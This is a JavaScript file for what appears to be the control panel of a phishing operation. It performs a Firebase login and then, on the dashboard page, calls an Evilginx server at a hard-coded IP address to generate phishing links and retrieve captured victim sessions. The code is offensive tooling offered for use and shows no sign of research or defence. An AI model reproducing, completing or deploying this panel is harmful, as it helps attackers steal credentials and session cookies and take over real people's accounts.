console.log("✅ Script.js loaded successfully");

// Ensure Firebase is initialized before using authentication
if (typeof firebase === 'undefined') {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
} else {
    console.log("✅ Firebase is available.");
}

// LOGIN FUNCTION
document.getElementById("loginBtn").addEventListener("click", function () {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (!firebase.auth) {
        console.error("❌ Firebase Auth is not available.");
        return;
    }

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(() => {
            console.log("✅ Login successful. Redirecting...");
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            document.getElementById("loginError").innerText = error.message;
            console.error("Login Error:", error);
        });
});

// ---- Evilginx Server API Integration ----

const EVILGINX_SERVER = "http://3.149.242.245:5000"; // Ensure port 5000 is included

async function generatePhishingLink() {
    try {
        const response = await fetch(`${EVILGINX_SERVER}/generate_link`);
        const data = await response.json();
        console.log("Generated Link:", data);
    } catch (error) {
        console.error("❌ Error generating link:", error);
    }
}

async function getCapturedSessions() {
    try {
        const response = await fetch(`${EVILGINX_SERVER}/captured_sessions`);
        const data = await response.json();
        console.log("Captured Sessions:", data);
    } catch (error) {
        console.error("❌ Error fetching captured sessions:", error);
    }
}

// Ensure API is called only on Dashboard page
if (window.location.pathname.includes("dashboard.html")) {
    generatePhishingLink();
    getCapturedSessions();
}
